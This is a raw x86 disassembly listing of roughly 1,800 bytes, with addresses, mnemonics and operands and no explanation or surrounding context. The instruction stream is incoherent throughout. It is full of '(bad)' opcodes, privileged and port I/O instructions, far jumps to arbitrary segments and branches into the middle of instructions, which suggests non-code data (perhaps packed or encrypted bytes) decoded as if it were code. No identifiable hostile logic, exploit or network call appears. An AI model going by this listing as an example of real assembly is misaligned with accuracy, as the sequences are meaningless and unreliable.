  41e974:	mov    cl,BYTE PTR [edx+0x38]
  41e977:	imul   al
  41e979:	mov    al,ds:0x7299239f
  41e97e:	ins    DWORD PTR es:[edi],dx
  41e97f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e980:	push   eax
  41e981:	adc    eax,0x3fbf0415
  41e986:	xchg   edi,eax
  41e987:	outs   dx,BYTE PTR ds:[esi]
  41e988:	sbb    al,0xa8
  41e98a:	sbb    al,0x51
  41e98c:	jle    0x41e934
  41e98e:	adc    BYTE PTR [ecx+0x5220c75f],bh
  41e994:	out    dx,eax
  41e995:	jp     0x41e956
  41e997:	xor    BYTE PTR [esi+esi*8-0x75263dd7],0xc7
  41e99f:	cmp    eax,0x3d5ed9e0
  41e9a4:	rcl    DWORD PTR [edi],cl
  41e9a6:	pop    esp
  41e9a7:	mov    al,ds:0x8b2e25ec
  41e9ac:	dec    ecx
  41e9ad:	mov    WORD PTR [eax+0x3d23023f],?
  41e9b3:	mov    esi,0x4210bc89
  41e9b8:	cdq    
  41e9b9:	lahf   
  41e9ba:	push   ebp
  41e9bb:	jmp    0x21:0x15713829
  41e9c2:	mov    ds:0xb5d87e3c,al
  41e9c7:	jg     0x41ea32
  41e9c9:	(bad)  
  41e9ca:	mov    eax,ds:0x65930786
  41e9cf:	sbb    bl,BYTE PTR [edx]
  41e9d1:	mov    bl,0x5a
  41e9d3:	js     0x41ea08
  41e9d5:	jbe    0x41e9d4
  41e9d7:	ins    BYTE PTR es:[edi],dx
  41e9d8:	rol    BYTE PTR [edi],cl
  41e9da:	into   
  41e9db:	inc    ebp
  41e9dc:	or     ah,BYTE PTR [edx-0x56477d5c]
  41e9e2:	repnz xor DWORD PTR [esi-0x258ce81a],edi
  41e9e9:	jbe    0x41e9e7
  41e9eb:	inc    edx
  41e9ec:	sar    BYTE PTR [edi-0x5ab23c89],cl
  41e9f2:	adc    DWORD PTR [ebp+0x5c],ebp
  41e9f5:	adc    DWORD PTR [esi-0x4f],ebx
  41e9f8:	pusha  
  41e9f9:	pop    esi
  41e9fa:	icebp  
  41e9fb:	dec    ecx
  41e9fc:	jns    0x41e9c1
  41e9fe:	(bad)  
  41e9ff:	xor    ch,BYTE PTR [esi-0x69682e6c]
  41ea05:	rol    DWORD PTR [eax],0xee
  41ea08:	inc    edx
  41ea09:	xchg   BYTE PTR [ebx],dh
  41ea0b:	mov    esi,0xf0fc777b
  41ea10:	call   FWORD PTR [edx+ebx*8-0x1c793403]
  41ea17:	cmp    DWORD PTR [edx],ebx
  41ea19:	xchg   esi,eax
  41ea1a:	inc    esi
  41ea1b:	sub    eax,0x335e0963
  41ea20:	push   0xf525234e
  41ea25:	and    eax,0x1e891193
  41ea2a:	push   0x19c8c447
  41ea2f:	push   esi
  41ea30:	pop    esi
  41ea31:	push   cs
  41ea32:	ret    
  41ea33:	jmp    0x41ea6c
  41ea35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea36:	sbb    al,0xb1
  41ea38:	pop    ds
  41ea39:	push   edi
  41ea3a:	scas   eax,DWORD PTR es:[edi]
  41ea3b:	mov    eax,ds:0x662176b9
  41ea40:	add    edx,ecx
  41ea42:	push   esp
  41ea43:	cmp    eax,0xdf0d9adc
  41ea48:	sbb    dh,BYTE PTR [ebx]
  41ea4a:	jp     0x41eac3
  41ea4c:	fwait
  41ea4d:	mov    ecx,0xe3bcefba
  41ea52:	add    eax,0xe5517ff4
  41ea57:	dec    edi
  41ea58:	lods   eax,DWORD PTR ds:[esi]
  41ea59:	dec    edx
  41ea5a:	jb     0x41ea70
  41ea5c:	inc    eax
  41ea5d:	es mov al,0xbe
  41ea60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea61:	test   DWORD PTR [ebx+0x2447ce36],esi
  41ea67:	add    ebx,DWORD PTR es:[ecx+0x26ae2990]
  41ea6e:	pop    es
  41ea6f:	shl    BYTE PTR [eax+eiz*4+0x42],cl
  41ea73:	sbb    DWORD PTR [edx-0x4da5bf09],esi
  41ea79:	(bad)  
  41ea7a:	daa    
  41ea7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea7c:	inc    ecx
  41ea7d:	push   ebp
  41ea7e:	xor    al,0x4c
  41ea80:	into   
  41ea81:	lods   eax,DWORD PTR ds:[esi]
  41ea82:	aam    0x9e
  41ea84:	iret   
  41ea85:	dec    esi
  41ea86:	cmp    eax,0x324ad0e5
  41ea8b:	aam    0xcc
  41ea8d:	xor    BYTE PTR [eax-0x5a],dl
  41ea90:	inc    ecx
  41ea91:	lods   al,BYTE PTR ds:[esi]
  41ea92:	daa    
  41ea93:	mov    bh,BYTE PTR [ebx-0x38c83c94]
  41ea99:	mov    cl,0x53
  41ea9b:	fld    DWORD PTR [edx]
  41ea9d:	fwait
  41ea9e:	adc    ah,BYTE PTR [edi+ecx*1-0x25d178c3]
	...
  41eab1:	jle    0x41ea75
  41eab3:	in     al,dx
  41eab4:	push   cs
  41eab5:	cld    
  41eab6:	cs (bad) 
  41eab8:	repnz lods eax,DWORD PTR ds:[esi]
  41eaba:	add    BYTE PTR [eax],bl
  41eabc:	xor    al,0x24
  41eabe:	pop    esp
  41eabf:	pop    esp
  41eac0:	dec    ebx
  41eac1:	aad    0x65
  41eac3:	add    DWORD PTR [eax],eax
  41eac5:	lods   al,BYTE PTR ds:[esi]
  41eac6:	add    eax,DWORD PTR [eax]
  41eac8:	add    BYTE PTR ds:0x69afb081,cl
  41eace:	or     ecx,esi
  41ead0:	inc    edx
  41ead1:	imul   ebp,DWORD PTR [edx],0x32
  41ead4:	mov    ebp,0xcf64613d
  41ead9:	xor    BYTE PTR [edi*8+0x13ee6dc6],bl
  41eae0:	jge    0x41ea90
  41eae2:	jnp    0x41eb59
  41eae4:	stc    
  41eae5:	test   DWORD PTR [esi+0x68],edx
  41eae8:	xchg   ebp,eax
  41eae9:	jmp    0xbd2ef23d
  41eaee:	test   ebx,0x73c5aa97
  41eaf4:	data16 jmp 0x41eaaa
  41eaf7:	icebp  
  41eaf8:	xchg   edi,eax
  41eaf9:	sub    eax,0xab8cb5aa
  41eafe:	nop
  41eaff:	cld    
  41eb00:	ret    
  41eb01:	shl    DWORD PTR [edi+0x62],cl
  41eb04:	inc    esi
  41eb05:	and    DWORD PTR ss:[ebx-0x5c],edx
  41eb09:	and    al,0x78
  41eb0b:	cmc    
  41eb0c:	dec    eax
  41eb0d:	retfw  0x77cd
  41eb11:	xor    BYTE PTR [ecx-0x7f],ah
  41eb14:	mov    edx,ds
  41eb16:	imul   ebp,DWORD PTR [ebx-0x5d6f332a],0x34789196
  41eb20:	adc    esp,ebx
  41eb22:	fcmovb st,st(6)
  41eb24:	xor    cl,BYTE PTR [ebx]
  41eb26:	xchg   DWORD PTR [ebp-0x7dd73a74],esi
  41eb2c:	stos   DWORD PTR es:[edi],eax
  41eb2d:	xor    esp,DWORD PTR [eax]
  41eb2f:	xor    BYTE PTR [edi],0x56
  41eb32:	mov    bh,0x61
  41eb34:	jp     0x41eb24
  41eb36:	sti    
  41eb37:	jle    0x41eb01
  41eb39:	inc    esi
  41eb3a:	push   esp
  41eb3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb3c:	cmp    eax,DWORD PTR [edi]
  41eb3e:	loop   0x41eb28
  41eb40:	dec    edx
  41eb41:	xchg   ebx,eax
  41eb42:	(bad)  
  41eb43:	adc    eax,0x83ec57a0
  41eb48:	mov    esi,0xe8871b55
  41eb4d:	idiv   DWORD PTR [esi]
  41eb4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb50:	dec    eax
  41eb51:	push   0x79
  41eb53:	xor    DWORD PTR [ebx+0xd],ebx
  41eb56:	push   edx
  41eb57:	dec    eax
  41eb58:	ins    DWORD PTR es:[edi],dx
  41eb59:	inc    ebx
  41eb5a:	cld    
  41eb5b:	lock xchg BYTE PTR [eax+0x25],dl
  41eb5f:	int3   
  41eb60:	sub    edi,DWORD PTR [ebp+0x1fcd29df]
  41eb66:	arpl   WORD PTR [ecx-0x30c8e4ca],di
  41eb6c:	sbb    dh,bh
  41eb6e:	iret   
  41eb6f:	jle    0x41eb83
  41eb71:	sub    eax,0x31e40d4f
  41eb76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb77:	mov    edx,0x9fc57ca6
  41eb7c:	ror    BYTE PTR [edi+0x459c9490],0xce
  41eb83:	sub    al,0x55
  41eb85:	enter  0x797,0xf2
  41eb89:	sbb    edx,DWORD PTR [edi+0x4fc318ef]
  41eb8f:	sub    dl,BYTE PTR [eax]
  41eb91:	push   es
  41eb92:	sub    DWORD PTR [eax-0x54ef5e9a],edi
  41eb98:	loop   0x41eb75
  41eb9a:	stc    
  41eb9b:	call   0x69521388
  41eba0:	pop    ecx
  41eba1:	retf   
  41eba2:	(bad)
  41eba5:	sbb    DWORD PTR ds:[esi+edi*8-0xab04a1],ecx
  41ebad:	outs   dx,DWORD PTR ds:[esi]
  41ebae:	mov    eax,ds:0xb43b2ada
  41ebb3:	inc    ebp
  41ebb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ebb5:	mov    ch,0xb5
  41ebb7:	sbb    BYTE PTR ds:0x9f7d4f25,bl
  41ebbd:	mov    cl,0x7a
  41ebbf:	jns    0x41eba3
  41ebc1:	cmc    
  41ebc2:	mov    gs,edi
  41ebc4:	mov    esp,0x5768224e
  41ebc9:	pop    ebp
  41ebca:	loop   0x41ebc4
  41ebcc:	push   edx
  41ebcd:	scas   al,BYTE PTR es:[edi]
  41ebce:	dec    ebx
  41ebcf:	mov    ebp,0xb4d69317
  41ebd4:	jmp    0x41eba1
  41ebd6:	scas   al,BYTE PTR es:[edi]
  41ebd7:	xchg   esi,eax
  41ebd8:	adc    esp,DWORD PTR [eax+0x50]
  41ebdb:	adc    eax,0x2a09ba16
  41ebe0:	stos   DWORD PTR es:[edi],eax
  41ebe1:	mov    dh,BYTE PTR [eax+0x76c1f518]
  41ebe7:	add    dh,BYTE PTR [edi-0xd]
  41ebea:	jecxz  0x41ebe4
  41ebec:	in     al,0x54
  41ebee:	mul    DWORD PTR [ebx]
  41ebf0:	xor    edx,DWORD PTR [edi]
  41ebf2:	rcl    BYTE PTR [ebp-0xef8b6ac],1
  41ebf8:	cwde   
  41ebf9:	pop    esp
  41ebfa:	pushf  
  41ebfb:	sar    BYTE PTR [edi-0x6e96f6fe],1
  41ec01:	ins    BYTE PTR es:[edi],dx
  41ec02:	inc    ebp
  41ec03:	jne    0x41ec2c
  41ec05:	addr16 sub eax,0xceec3d9b
  41ec0b:	loope  0x41ebc1
  41ec0d:	stos   DWORD PTR es:[edi],eax
  41ec0e:	mov    ch,dh
  41ec10:	sub    al,0xe7
  41ec12:	cmp    DWORD PTR [ecx+0x39],ebx
  41ec15:	add    al,0xc8
  41ec17:	outs   dx,DWORD PTR ds:[esi]
  41ec18:	dec    eax
  41ec19:	dec    ebp
  41ec1a:	sub    cl,ch
  41ec1c:	(bad)  
  41ec1d:	adc    ebp,DWORD PTR [ebx+0x21]
  41ec20:	sub    al,0x23
  41ec22:	or     DWORD PTR [eax+0x34],ecx
  41ec25:	mov    dl,0xff
  41ec27:	adc    eax,0xcf800e71
  41ec2c:	jae    0x41ecab
  41ec2e:	dec    esp
  41ec2f:	lods   al,BYTE PTR ds:[esi]
  41ec30:	les    eax,FWORD PTR [esp+ebx*2+0x4bfd7e60]
  41ec37:	xor    BYTE PTR [esi],0x2c
  41ec3a:	cmp    dl,0x6d
  41ec3d:	mov    BYTE PTR [ecx],ah
  41ec3f:	pop    ss
  41ec40:	add    ebp,DWORD PTR [esi]
  41ec42:	das    
  41ec43:	lock xchg ecx,eax
  41ec45:	push   ebx
  41ec46:	xor    BYTE PTR fs:[esi+0x39990abb],cl
  41ec4d:	inc    eax
  41ec4e:	dec    ebx
  41ec4f:	or     BYTE PTR [ecx+edi*4+0x52ac373],al
  41ec56:	push   esi
  41ec57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec58:	mov    al,ds:0x20935d5d
  41ec5d:	imul   ebx,DWORD PTR [edi-0x37],0x9c687fb1
  41ec64:	add    esi,DWORD PTR [edx+0x6a8acbf7]
  41ec6a:	jo     0x41ecc1
  41ec6c:	cmp    DWORD PTR [edx+0x7b],ebp
  41ec6f:	clc    
  41ec70:	arpl   si,bp
  41ec72:	ja     0x41ebfc
  41ec74:	cmp    DWORD PTR [ecx-0x34],0xffffffb0
  41ec78:	mov    ah,0x2b
  41ec7a:	js     0x41ec8d
  41ec7c:	xor    DWORD PTR [ecx-0x4c],ebx
  41ec7f:	or     dh,ah
  41ec81:	repnz add BYTE PTR [esi+ecx*4],0xa4
  41ec86:	popa   
  41ec87:	fidivr WORD PTR [esi-0x31]
  41ec8a:	mov    ebp,DWORD PTR [ecx+0xe7585cc]
  41ec90:	cdq    
  41ec91:	mov    cl,0xfc
  41ec93:	xchg   edi,eax
  41ec94:	daa    
  41ec95:	dec    ebx
  41ec96:	lods   al,BYTE PTR ds:[esi]
  41ec97:	les    ax,DWORD PTR [edx+0x61]
  41ec9b:	jmp    0x41ec46
  41ec9d:	mov    edx,0x68e0ac50
  41eca2:	add    edi,eax
  41eca4:	imul   DWORD PTR ss:[edx-0x2f]
  41eca8:	mov    esi,0x412e03ac
  41ecad:	iret   
  41ecae:	in     al,0x77
  41ecb0:	sub    dh,BYTE PTR [eax+ebp*1+0x552ff2d5]
  41ecb7:	vcvtsd2ss xmm4,xmm0,xmm7
  41ecbb:	inc    ebx
  41ecbc:	or     BYTE PTR ds:0x28a48be1,dh
  41ecc2:	jno    0x41ed40
  41ecc4:	neg    cl
  41ecc6:	add    DWORD PTR [edi],ebp
  41ecc8:	es nop
  41ecca:	imul   esi,esp,0x27
  41eccd:	out    0xdc,eax
  41eccf:	jno    0x41ec73
  41ecd1:	ins    DWORD PTR es:[edi],dx
  41ecd2:	cld    
  41ecd3:	scas   eax,DWORD PTR es:[edi]
  41ecd4:	out    0x6d,al
  41ecd6:	in     al,0xf9
  41ecd8:	gs ja  0x41ece1
  41ecdb:	jne    0x41ecbe
  41ecdd:	shl    DWORD PTR [ecx+0x6f],1
  41ece0:	or     eax,0xb1f9d103
  41ece5:	pop    esi
  41ece6:	retf   0xdd8b
  41ece9:	imul   ebp,eax,0xf9cd3928
  41ecef:	imul   ebx,DWORD PTR [edx+0x7a0d66f5],0xa20d73d4
  41ecf9:	jae    0x41ecf9
  41ecfb:	sub    esi,DWORD PTR [esi+0x2a]
  41ecfe:	sub    DWORD PTR [edx],ebx
  41ed00:	ins    BYTE PTR es:[edi],dx
  41ed01:	push   ecx
  41ed02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed03:	jge    0x41ecbd
  41ed05:	xor    DWORD PTR [esi],ebx
  41ed07:	and    al,0xb1
  41ed09:	arpl   WORD PTR [ebp+ecx*2+0x47],dx
  41ed0d:	pop    eax
  41ed0e:	shr    ah,cl
  41ed10:	imul   ebx,DWORD PTR [edi],0xffffffe4
  41ed13:	fnstcw WORD PTR [eax]
  41ed15:	pop    esi
  41ed16:	mov    ds:0xe1f3bf82,eax
  41ed1b:	dec    edx
  41ed1c:	push   eax
  41ed1d:	xor    eax,0x6063a4bd
  41ed22:	push   esp
  41ed23:	add    al,0xee
  41ed25:	pop    ebx
  41ed26:	xchg   ebp,eax
  41ed27:	stc    
  41ed28:	pop    edx
  41ed29:	mov    BYTE PTR [ebx-0x4e],ch
  41ed2c:	add    BYTE PTR [eax+ecx*4],0xc
  41ed30:	xor    cl,BYTE PTR [ecx]
  41ed32:	hlt    
  41ed33:	sahf   
  41ed34:	pop    edx
  41ed35:	in     eax,0x68
  41ed37:	arpl   WORD PTR [ecx-0x3dd1d2e],bp
  41ed3d:	shl    BYTE PTR [ebp+0x6b],1
  41ed40:	cmp    eax,0x58827fbd
  41ed45:	das    
  41ed46:	push   esi
  41ed47:	es jp  0x41edbb
  41ed4a:	mov    ebx,DWORD PTR [eax]
  41ed4c:	icebp  
  41ed4d:	lds    eax,FWORD PTR [edx]
  41ed4f:	into   
  41ed50:	pop    DWORD PTR [ebp+eiz*2-0x44]
  41ed54:	mov    al,ds:0x35548c8e
  41ed59:	cmp    DWORD PTR [ecx],eax
  41ed5b:	out    dx,eax
  41ed5c:	mov    ebx,0x4dd8ba7a
  41ed61:	push   cs
  41ed62:	cmp    ch,BYTE PTR [ecx]
  41ed64:	mov    edx,0x4038ae95
  41ed69:	jg     0x41edad
  41ed6b:	iret   
  41ed6c:	jno    0x41ed7a
  41ed6e:	xchg   edi,eax
  41ed6f:	sub    al,BYTE PTR [ecx]
  41ed71:	fimul  WORD PTR ds:0x304e00aa
  41ed77:	add    eax,0x4e9e36c3
  41ed7c:	pushf  
  41ed7d:	or     DWORD PTR [eax-0x74928556],ebp
  41ed83:	shr    BYTE PTR [edx+0x78840ffa],1
  41ed89:	int    0x6
  41ed8b:	mov    cl,0x45
  41ed8d:	jne    0x41ed40
  41ed8f:	(bad)  
  41ed91:	pusha  
  41ed92:	xlat   BYTE PTR ds:[ebx]
  41ed93:	popf   
  41ed94:	pop    ebx
  41ed95:	jb     0x41edee
  41ed97:	aam    0xb7
  41ed99:	and    eax,0xb9e71b24
  41ed9e:	ror    DWORD PTR ds:0x26eb8cf5,0xeb
  41eda5:	frstor [ebx]
  41eda7:	pop    esp
  41eda8:	loopne 0x41eddc
  41edaa:	push   ebp
  41edab:	js     0x41ed61
  41edad:	push   cs
  41edae:	add    eax,0x7e81a6e2
  41edb3:	pop    edi
  41edb4:	inc    edi
  41edb5:	sar    BYTE PTR [ebx],1
  41edb7:	mov    ecx,0xa16780d2
  41edbc:	das    
  41edbd:	in     eax,dx
  41edbe:	lea    esi,[esp+edx*1-0x48a8c8d9]
  41edc5:	push   eax
  41edc6:	cs mov esi,0x78c79b2c
  41edcc:	dec    ecx
  41edcd:	fist   WORD PTR [edi+0xe]
  41edd0:	in     eax,dx
  41edd1:	mov    al,0xec
  41edd3:	outs   dx,BYTE PTR ds:[esi]
  41edd4:	mov    esp,0x52717318
  41edd9:	neg    BYTE PTR [edi+0x0]
  41eddc:	dec    ebp
  41eddd:	out    dx,eax
  41edde:	jmp    0xdfb1:0xf13d7ebc
  41ede5:	sti    
  41ede6:	js     0x41ee12
  41ede8:	pop    ecx
  41ede9:	and    DWORD PTR [ebx+0x7365ccdd],eax
  41edef:	je     0x41ee60
  41edf1:	out    dx,al
  41edf2:	push   es
  41edf3:	xor    edi,ebx
  41edf5:	jo     0x41ee28
  41edf7:	xchg   ebx,eax
  41edf8:	pop    ebp
  41edf9:	(bad)  
  41edfa:	sub    ebp,DWORD PTR [edx+0x7c]
  41edfd:	and    ebp,0x3f
  41ee00:	fisttp QWORD PTR [edx]
  41ee02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee03:	test   bh,cl
  41ee05:	imul   esi,DWORD PTR [ecx+0x41],0xf4ad436d
  41ee0c:	cmp    eax,DWORD PTR [edi]
  41ee0e:	test   BYTE PTR [ecx+0x25],bl
  41ee11:	xchg   ecx,eax
  41ee12:	cpuid  
  41ee14:	sub    eax,0x6dda81b7
  41ee19:	not    BYTE PTR [edi+0x20]
  41ee1c:	ins    DWORD PTR es:[edi],dx
  41ee1d:	xor    eax,0x62cc5712
  41ee22:	dec    edi
  41ee23:	xchg   esi,eax
  41ee24:	xor    DWORD PTR [edx-0x50],ebp
  41ee27:	dec    ecx
  41ee28:	jmp    0x41ee98
  41ee2a:	mov    ds:0x183ebd79,al
  41ee2f:	ds (bad) 
  41ee32:	aaa    
  41ee33:	retf   0x653d
  41ee36:	mov    bl,0x11
  41ee38:	mov    ecx,0xb4c97276
  41ee3d:	out    dx,eax
  41ee3e:	rol    DWORD PTR [esi],0x12
  41ee41:	xor    DWORD PTR [eax],esp
  41ee43:	push   ebx
  41ee44:	stos   DWORD PTR es:[edi],eax
  41ee45:	(bad)  
  41ee46:	pop    esi
  41ee47:	mov    ch,0x61
  41ee49:	pop    ds
  41ee4a:	cmp    dl,ch
  41ee4c:	mov    edi,0x64acabb7
  41ee51:	enterw 0x985c,0xa9
  41ee56:	les    ebp,FWORD PTR ds:0xcc849405
  41ee5c:	in     al,dx
  41ee5d:	retf   0x4fda
  41ee60:	push   eax
  41ee61:	test   eax,0x4ed82735
  41ee66:	pop    ebp
  41ee67:	lods   al,BYTE PTR ds:[esi]
  41ee68:	retf   
  41ee69:	iret   
  41ee6a:	jmp    0x2d2c99ca
  41ee6f:	imul   edi,DWORD PTR [ebx+ecx*1+0xa57027],0x0
  41ee7a:	add    BYTE PTR [eax],al
  41ee7c:	add    BYTE PTR [eax],al
  41ee7e:	add    BYTE PTR [eax],al
  41ee80:	add    BYTE PTR [esi-0x37],cl
  41ee83:	(bad)  [edi+ebx*8+0x5c]
  41ee87:	(bad)  
  41ee89:	mov    al,ds:0xe42f76e4
  41ee8e:	inc    esp
  41ee8f:	mov    dh,0x63
  41ee91:	sub    DWORD PTR [ecx+0x1],0x3ac00
  41ee98:	add    bh,al
  41ee9a:	jne    0x41ef12
  41ee9c:	xchg   edi,eax
  41ee9d:	bound  esi,QWORD PTR [ebx]
  41ee9f:	fimul  DWORD PTR [esi+0x275a709f]
  41eea5:	test   al,0x84
  41eea7:	rcl    DWORD PTR [ebx-0x10],1
  41eeaa:	mov    al,ds:0x3fe88028
  41eeaf:	pop    edx
  41eeb0:	adc    al,0xc6
  41eeb2:	mov    eax,ds:0x1e164155
  41eeb7:	dec    esi
  41eeb8:	sbb    dh,ah
  41eeba:	cmp    al,0xbd
  41eebc:	xchg   esp,eax
  41eebd:	in     eax,0x73
  41eebf:	mov    ?,WORD PTR [edx+eiz*1]
  41eec2:	enter  0x484b,0xda
  41eec6:	fcmove st,st(5)
  41eec8:	lods   al,BYTE PTR ds:[esi]
  41eec9:	in     al,0x9f
  41eecb:	(bad)  
  41eecc:	dec    ecx
  41eecd:	call   0x24674380
  41eed2:	jp     0x41eeb1
  41eed4:	rcr    DWORD PTR [ecx],1
  41eed6:	pop    ebp
  41eed7:	mov    ds:0xaefa5b97,eax
  41eedc:	mov    edi,0xdf20e9f9
  41eee1:	cmp    DWORD PTR [ebx+0x693d88dc],edi
  41eee7:	out    dx,al
  41eee8:	mov    dh,0xf1
  41eeea:	lods   al,BYTE PTR ds:[esi]
  41eeeb:	lods   al,BYTE PTR ds:[esi]
  41eeec:	add    ah,BYTE PTR [ecx+0x44]
  41eeef:	daa    
  41eef0:	mov    cl,0xc4
  41eef2:	mov    ecx,0xe54d5aea
  41eef7:	xor    DWORD PTR [ebx+0x1d],ebx
  41eefa:	inc    edx
  41eefb:	mov    al,0x9a
  41eefd:	mov    bh,0xb
  41eeff:	movd   DWORD PTR [ebx],mm1
  41ef02:	in     eax,dx
  41ef03:	(bad)  
  41ef04:	jnp    0x41eef2
  41ef06:	mov    cl,0xf1
  41ef08:	xchg   edx,eax
  41ef09:	mov    bl,0x66
  41ef0b:	cld    
  41ef0c:	inc    edx
  41ef0d:	mul    BYTE PTR [esi-0x58506858]
  41ef13:	or     eax,0x82274033
  41ef18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef19:	dec    edx
  41ef1a:	xchg   ebx,eax
  41ef1b:	mov    bh,0x93
  41ef1d:	loopne 0x41eebd
  41ef1f:	sahf   
  41ef20:	sub    DWORD PTR [eax+eax*8-0x2f599e99],edi
  41ef27:	sbb    eax,0xc3c9bdfc
  41ef2c:	enter  0x43bd,0x13
  41ef30:	and    dl,BYTE PTR [ebx]
  41ef32:	in     eax,0x4b
  41ef34:	cmp    al,0xbb
  41ef36:	sub    bh,dl
  41ef38:	stc    
  41ef39:	jg     0x41eefa
  41ef3b:	inc    eax
  41ef3c:	iret   
  41ef3d:	call   FWORD PTR [ecx]
  41ef3f:	pop    edi
  41ef40:	xchg   dh,bl
  41ef42:	push   es
  41ef43:	jne    0x41ef28
  41ef45:	call   0x9a5b:0xb6efac89
  41ef4c:	or     BYTE PTR [eax],0xd0
  41ef4f:	aam    0xfd
  41ef51:	hlt    
  41ef52:	scas   eax,DWORD PTR es:[edi]
  41ef53:	ud1    edx,DWORD PTR [eax+0x6a36a7d6]
  41ef5a:	pop    ss
  41ef5b:	in     eax,dx
  41ef5c:	mov    ebp,0x44c3622
  41ef61:	stos   BYTE PTR es:[edi],al
  41ef62:	(bad)
  41ef65:	rol    bh,1
  41ef67:	rcl    BYTE PTR [ebp+0x55],cl
  41ef6a:	je     0x41efb6
  41ef6c:	add    al,0xe6
  41ef6e:	cwde   
  41ef6f:	jnp    0x41ef91
  41ef71:	cmp    ch,BYTE PTR [esp+eiz*2+0x1ad2945d]
  41ef78:	dec    ebp
  41ef79:	sbb    al,0x8a
  41ef7b:	and    bl,dl
  41ef7d:	lahf   
  41ef7e:	pop    ebx
  41ef7f:	fwait
  41ef80:	sbb    ch,BYTE PTR ds:0xe5541090
  41ef86:	pop    eax
  41ef87:	cli    
  41ef88:	lea    edx,[edi]
  41ef8a:	sti    
  41ef8b:	shr    dl,0x6b
  41ef8e:	or     edx,DWORD PTR [edi-0x4ffef726]
  41ef94:	sbb    DWORD PTR [eax-0x330bc98],edx
  41ef9a:	add    ebx,edx
  41ef9c:	loop   0x41ef3f
  41ef9e:	xlat   BYTE PTR es:[ebx]
  41efa0:	call   0xab8:0xad07b150
  41efa7:	pop    ebp
  41efa8:	or     bh,cl
  41efaa:	adc    ebp,DWORD PTR [ebx-0x14]
  41efad:	inc    esp
  41efae:	jnp    0x41f005
  41efb0:	add    DWORD PTR [edi+0x534c2ee5],esp
  41efb6:	mov    ebp,0x78bcfd60
  41efbb:	outs   dx,DWORD PTR ds:[esi]
  41efbc:	bound  ebp,QWORD PTR [edi-0x3a0808df]
  41efc2:	cmp    BYTE PTR [edx+0xd],ch
  41efc5:	push   es
  41efc6:	dec    esp
  41efc7:	sub    al,0x1f
  41efc9:	ficomp DWORD PTR [edx]
  41efcb:	retf   0x1e86
  41efce:	or     ebx,DWORD PTR [ecx-0x5b]
  41efd1:	cmc    
  41efd2:	jmp    0x41efb4
  41efd4:	mov    ecx,0x5f8f21ea
  41efd9:	(bad)  [ecx+0x5e058e36]
  41efdf:	jp     0x41efbb
  41efe1:	mov    cl,0xc0
  41efe3:	mov    esp,0x10c27ea8
  41efe8:	inc    ebx
  41efe9:	adc    BYTE PTR [eax],dl
  41efeb:	imul   ebp,DWORD PTR [ecx],0xffffff84
  41efee:	sar    DWORD PTR [esi-0x7d42fde9],cl
  41eff4:	fistp  QWORD PTR [ebp-0x267df4de]
  41effa:	daa    
  41effb:	fisttp WORD PTR [eax+ecx*1+0x67]
  41efff:	daa    
  41f000:	adc    BYTE PTR [edx],ah
  41f002:	fs mov dh,bh
  41f005:	jae    0x41ef8c
  41f007:	aaa    
  41f008:	rcr    BYTE PTR [ebx+0x26],cl
  41f00b:	and    eax,0xbeb60d90
  41f010:	out    0xc0,eax
  41f012:	fist   WORD PTR [esi+edi*1-0x52f80548]
  41f019:	sbb    ch,BYTE PTR [ebx+0x26]
  41f01c:	xor    BYTE PTR [esi],0x21
  41f01f:	push   ebx
  41f020:	in     eax,0x55
  41f022:	icebp  
  41f023:	out    dx,eax
  41f024:	adc    ebx,DWORD PTR [ecx-0x51]
  41f027:	cdq    
  41f028:	test   DWORD PTR [esi],eax
  41f02a:	int    0xeb
  41f02c:	inc    ecx
  41f02d:	popa   
  41f02e:	push   es
  41f02f:	shr    ebp,0x92
  41f032:	mov    bh,0x5f
  41f034:	lods   eax,DWORD PTR ds:[si]
  41f036:	and    edi,DWORD PTR [ebp-0x7c]
  41f039:	daa    
  41f03a:	dec    edx
  41f03b:	out    0xb3,al
  41f03d:	add    al,0x2d
  41f03f:	out    dx,al
  41f040:	adc    BYTE PTR [edx-0x63],al
  41f043:	dec    bx
  41f045:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f046:	pop    edi
  41f047:	cmp    DWORD PTR [ecx],edi
  41f049:	xor    ah,BYTE PTR [edx+edx*8-0x1e]
  41f04d:	mov    ?,WORD PTR [eax]
  41f04f:	push   0x9b8d047f
  41f054:	dec    ebx
  41f055:	add    ecx,DWORD PTR [eax-0x633e6e0a]
  41f05b:	into   
  41f05c:	xor    ebp,DWORD PTR [ebx-0x2f]
  41f05f:	cwde   
  41f060:	mov    bl,0x6b
  41f062:	xchg   esp,eax
  41f063:	add    BYTE PTR [ecx+0xe],0x15
  41f067:	(bad)  
  41f068:	mov    ds:0x6f3bbb57,eax
  41f06d:	or     edi,DWORD PTR [ebx-0x16]
  41f070:	push   cs
  41f071:	xor    ebx,ebx
  41f073:	cmp    BYTE PTR [ebx+0x58],ch
  41f076:	stos   BYTE PTR es:[edi],al
  41f077:	int    0x1e
  41f079:	mov    WORD PTR [edx-0x5],fs
  41f07c:	and    DWORD PTR [edi],ecx
  41f07e:	out    0xa4,al
  41f080:	xor    dl,BYTE PTR [ebp-0x67]
  41f083:	mov    edi,DWORD PTR [ebp+0x32]
  41f086:	(bad)  
  41f087:	aam    0x67
  41f089:	inc    eax
  41f08a:	xchg   bh,bl
  41f08c:	sub    al,0xfd
  41f08e:	out    dx,eax
  41f08f:	out    dx,eax
  41f090:	stos   BYTE PTR es:[edi],al
  41f091:	xchg   esi,eax
  41f092:	and    DWORD PTR [esi+0x18],ecx
  41f095:	ret    0xd0a
  41f098:	les    edx,FWORD PTR [ebx+0x1a]
  41f09b:	bound  esi,QWORD PTR fs:[edi+eax*4-0x2a52f410]
  41f0a3:	sar    DWORD PTR [ebx],cl
  41f0a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
